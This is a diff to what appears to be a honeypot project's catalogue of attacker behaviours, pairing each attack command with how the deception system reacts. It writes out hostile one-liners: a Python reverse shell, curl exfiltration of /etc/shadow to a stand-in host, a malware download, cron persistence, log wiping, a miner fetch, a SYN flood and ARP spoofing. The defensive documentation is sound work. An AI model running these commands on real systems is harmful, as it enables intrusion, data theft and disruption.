@@ -131,7 +131,17 @@ cat /etc/os-release; ls /etc/init.d
 
 ---
 
-**(04)-(Credential Preparation)-(L2)**
+**(04)-(Brute Force Attack)-(L1)**
+```bash
+hydra -l admin -P passlist.txt ssh://127.0.0.1
+```
+**Description:** Automated credential guessing attempt against the SSH service. This is the most common entry vector for botnets looking to expand their footprint.
+**Reaction:** Cowrie absorbs the hits and provides "slow-auth" responses to waste the attacker's resources while fingerprinting the brute-force tool.
+**Trigger:** **Bot Environment** (Cowrie Low-Interaction).
+
+---
+
+**(05)-(Credential Preparation)-(L2)**
 ```bash
 cat /etc/passwd; find / -name "*.history"
 ```
@@ -141,7 +151,12 @@ cat /etc/passwd; find / -name "*.history"
 
 ---
 
-**(05)-(External Payloading)-(L2)**
+### ⚡ Phase B: Interactive Escalation (Human-Centric / Tier 2)
+*High-risk behaviors that indicate manual control.*
+
+---
+
+**(06)-(External Payloading)-(L2)**
 ```bash
 wget http://example.com/malware.sh -O /tmp/malware.sh
 ```
@@ -151,12 +166,17 @@ wget http://example.com/malware.sh -O /tmp/malware.sh
 
 ---
 
-### ⚡ Phase B: Interactive Escalation (Human-Centric / Tier 2)
-*High-risk behaviors that indicate manual control.*
+**(07)-(SQL Injection Probing)-(L2)**
+```bash
+sqlmap --url="http://127.0.0.1/api/v1/user?id=1" --batch
+```
+**Description:** Using automated tools like `sqlmap` to probe local or networked web services for database vulnerabilities. This indicates an attempt to pivot from the shell to the application layer.
+**Reaction:** AADE presents a fake "vulnerable" API response to the tool, logging the specific payloads and database headers the attacker is attempting to blind-inject.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
 
 ---
 
-**(06)-(Sudo Privilege Probe)-(L2)**
+**(08)-(Sudo Privilege Probe)-(L2)**
 ```bash
 sudo -l
 ```
@@ -166,7 +186,7 @@ sudo -l
 
 ---
 
-**(07)-(Automated Persistence)-(L3)**
+**(09)-(Automated Persistence)-(L3)**
 ```bash
 (crontab -l ; echo "*/15 * * * * /tmp/malware.sh") | crontab -
 ```
@@ -176,7 +196,17 @@ sudo -l
 
 ---
 
-**(08)-(Anti-Forensics / Trace Removal)-(L3)**
+**(10)-(Cross Site Scripting (XSS))-(L3)**
+```bash
+curl -d "name=<script>alert('pwned')</script>" http://127.0.0.1/feedback
+```
+**Description:** Injecting malicious scripts into local web feedback forms or API endpoints. Attackers use this to test for reflected XSS vulnerabilities that could be used for session hijacking.
+**Reaction:** The VSOCK listener captures the raw payload. The dashboard maps this to **T1189 (Drive-by Compromise)** and highlights the script-tag injection.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
+
+---
+
+**(11)-(Anti-Forensics / Trace Removal)-(L3)**
 ```bash
 rm -rf /var/log/syslog; unset HISTFILE
 ```
@@ -186,7 +216,7 @@ rm -rf /var/log/syslog; unset HISTFILE
 
 ---
 
-**(09)-(Process Camouflage Monitor)-(L3)**
+**(12)-(Process Camouflage Monitor)-(L3)**
 ```bash
 ps aux | grep -v "malware"
 ```
@@ -196,7 +226,7 @@ ps aux | grep -v "malware"
 
 ---
 
-**(10)-(Direct Kernel Callback / Reverse Shell)-(L4)**
+**(13)-(Direct Kernel Callback / Reverse Shell)-(L4)**
 ```bash
 python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
@@ -211,7 +241,7 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
 
 ---
 
-**(11)-(Credential Persistence / SSH Keys)-(L4)**
+**(14)-(Credential Persistence / SSH Keys)-(L4)**
 ```bash
 ssh-keygen -t rsa -b 4096; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 ```
@@ -221,7 +251,7 @@ ssh-keygen -t rsa -b 4096; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
 
 ---
 
-**(12)-(Ransomware Deployment Flow)-(L4)**
+**(15)-(Ransomware Deployment Flow)-(L4)**
 ```bash
 gpg --symmetric --cipher-algo AES256 important_data.tar
 ```
@@ -231,7 +261,17 @@ gpg --symmetric --cipher-algo AES256 important_data.tar
 
 ---
 
-**(13)-(Resource Mining / Hijacking)-(L4)**
+**(16)-(DDoS Flood Attack)-(L4)**
+```bash
+hping3 -S --flood -V 10.0.0.5
+```
+**Description:** Using the compromised host to launch a high-volume SYN flood against an internal or external target. This turns the honeypot into a "zombie" in a larger botnet.
+**Reaction:** The **Honeywall** detects the abnormal outbound packet frequency and rate-limits the flow to 1Kbps to prevent real damage, while logging the target IP for downstream alerting.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
+
+---
+
+**(17)-(Resource Mining / Hijacking)-(L4)**
 ```bash
 curl -LO http://miner.pool/xmrig; chmod +x xmrig; ./xmrig -o pool.com &
 ```
@@ -241,7 +281,7 @@ curl -LO http://miner.pool/xmrig; chmod +x xmrig; ./xmrig -o pool.com &
 
 ---
 
-**(14)-(Kernel Escape Discovery)-(L5)**
+**(18)-(Kernel Escape Discovery)-(L5)**
 ```bash
 sysctl -w kernel.panic=1; cat /proc/kcore
 ```
@@ -251,12 +291,22 @@ sysctl -w kernel.panic=1; cat /proc/kcore
 
 ---
 
-**(15)-(Covert Exfiltration & Network Pivot)-(L5)**
+**(19)-(Covert Exfiltration & Network Pivot)-(L5)**
 ```bash
 curl --data-binary @/etc/shadow http://exfil.server/upload
 ```
 **Description:** Exfiltrating sensitive system files (the password shadow file) via a binary HTTP POST stream. This is a final attempt to harvest passwords for lateral enterprise movement.
 **Reaction:** The C2 Sinkhole captures the raw binary exfiltration stream, providing us with a copy of the attacker's protocol and the specific destination IOC.
+**Trigger:** **Human Environment** (Deep High-Interaction).
+
+---
+
+**(20)-(Man-in-the-Middle (MITM) Intercept)-(L5)**
+```bash
+arpspoof -i eth0 -t 10.0.0.5 10.0.0.1
+```
+**Description:** Attempting an ARP spoofing attack to intercept traffic between local hosts. This indicates the attacker is attempting to escalate from local access to full network-wide interception.
+**Reaction:** The **Honeywall** detects the unsolicited ARP replies. It allows the attacker to "see" fake traffic generated by the **LLM Synthesizer**, poisoning their perception of the internal network.
 **Trigger:** **Human Environment** (Deep High-Interaction).
 
 ---
